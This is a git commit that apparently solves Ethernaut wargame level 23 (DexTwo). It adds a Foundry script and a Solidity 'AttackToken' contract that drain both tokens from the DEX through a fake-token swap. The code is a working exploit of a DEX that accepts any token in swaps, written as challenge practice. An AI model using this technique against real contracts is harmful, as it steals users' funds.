86ba3176ced89e4c298500b9f7dd5b476e2cbaec
beeb <703631+beeb@users.noreply.github.com>
2023-10-04 16:21:08 +0200

    Level 23

---
+++ script/Level23.sol
@@ -0,0 +1,41 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity 0.8.20;
+
+import { Script, console2 } from "forge-std/Script.sol";
+import { Vm } from "forge-std/Vm.sol";
+import { Ethernaut } from "src/interfaces/IEthernaut.sol";
+import { DexTwo, SwappableTokenTwo } from "src/Level23.sol";
+import { AttackToken } from "src/Level23Attack.sol";
+
+contract Attack is Script {
+    Ethernaut ethernaut = Ethernaut(vm.envAddress("ETHERNAUT"));
+
+    function run() public {
+        uint256 deployerPrivateKey = vm.envUint("DEPLOYER_PRIVATE_KEY");
+        vm.startBroadcast(deployerPrivateKey);
+        vm.recordLogs();
+        ethernaut.createLevelInstance(0xf59112032D54862E199626F55cFad4F8a3b0Fce9);
+        Vm.Log[] memory entries = vm.getRecordedLogs();
+        address instanceAddress = address(uint160(uint256(entries[11].topics[2])));
+        console2.log(instanceAddress);
+        DexTwo instance = DexTwo(instanceAddress);
+
+        SwappableTokenTwo token1 = SwappableTokenTwo(instance.token1());
+        SwappableTokenTwo token2 = SwappableTokenTwo(instance.token2());
+        AttackToken attack = new AttackToken(instanceAddress, "BRUH", "BRH", 1000);
+        attack.approve(instanceAddress, 1000);
+        attack.transfer(instanceAddress, token1.balanceOf(instanceAddress));
+        instance.swap(address(attack), instance.token1(), token1.balanceOf(instanceAddress));
+        attack.transferFrom(
+            instanceAddress, attack.owner(), attack.balanceOf(instanceAddress) - token2.balanceOf(instanceAddress)
+        );
+        instance.swap(address(attack), instance.token2(), token2.balanceOf(instanceAddress));
+
+        console2.log(token1.balanceOf(instanceAddress));
+        console2.log(token2.balanceOf(instanceAddress));
+        require(token1.balanceOf(instanceAddress) == 0 && token2.balanceOf(instanceAddress) == 0, "Attack failed");
+
+        ethernaut.submitLevelInstance(instanceAddress);
+        vm.stopBroadcast();
+    }
+}
---
+++ src/Level23Attack.sol
@@ -0,0 +1,23 @@
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.20;
+
+import "openzeppelin/token/ERC20/ERC20.sol";
+
+contract AttackToken is ERC20 {
+    address private _dex;
+    address public owner;
+
+    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)
+        ERC20(name, symbol)
+    {
+        owner = msg.sender;
+        _mint(msg.sender, initialSupply);
+        _dex = dexInstance;
+        _approve(dexInstance, msg.sender, initialSupply); // we can get back tokens from the dex
+    }
+
+    function approve(address owner, address spender, uint256 amount) public {
+        require(owner != _dex, "InvalidApprover");
+        super._approve(owner, spender, amount);
+    }
+}
